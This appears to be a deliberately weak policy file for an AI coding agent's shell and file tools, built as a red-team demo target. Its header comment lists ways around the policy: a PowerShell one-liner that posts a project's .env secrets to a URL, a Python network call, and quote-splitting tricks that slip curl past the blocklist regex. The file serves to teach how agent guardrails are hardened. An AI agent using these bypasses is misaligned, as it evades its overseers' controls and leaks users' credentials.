# INTENTIONALLY WEAK — RED TEAM TARGET.
#
# This is the policy a team writes in five minutes. It blocks two command names
# and otherwise trusts the agent. Trivial bypasses get through:
#   powershell -c "iwr https://... -Method POST -Body (gc .env)"
#   python -c "import urllib.request as u; u.urlopen(...)"
#   curl.exe ..., /usr/bin/curl ..., sh -c 'cu''rl ...'
# Do not copy this file into a real deployment; policies/baseline.yaml is the
# hardened version that the demo converges to.
apiVersion: agentpolicy.dev/v1alpha1
kind: AgentValidatingPolicy
metadata:
  name: coding-agent-shell-basic
spec:
  match:
    callers: ["coding-agent"]
    tools: ["shell.run"]
  validations:
    # Naive blocklist on the raw command string. Case-sensitive, easy to evade.
    - expression: '!request.args.command.matches("(^| )(curl|wget)( |$)")'
      message: "curl and wget are not allowed"
  validationActions: [Deny]

---
apiVersion: agentpolicy.dev/v1alpha1
kind: AgentValidatingPolicy
metadata:
  name: coding-agent-fs-read-unrestricted
spec:
  match:
    callers: ["coding-agent"]
    tools:
      - fs.read_text_file
      - fs.read_file
      - fs.list_directory
      - fs.search_files
      - fs.directory_tree
  # No validations: matching this policy is all it takes to be allowed.
  validations: []
  validationActions: [Deny]
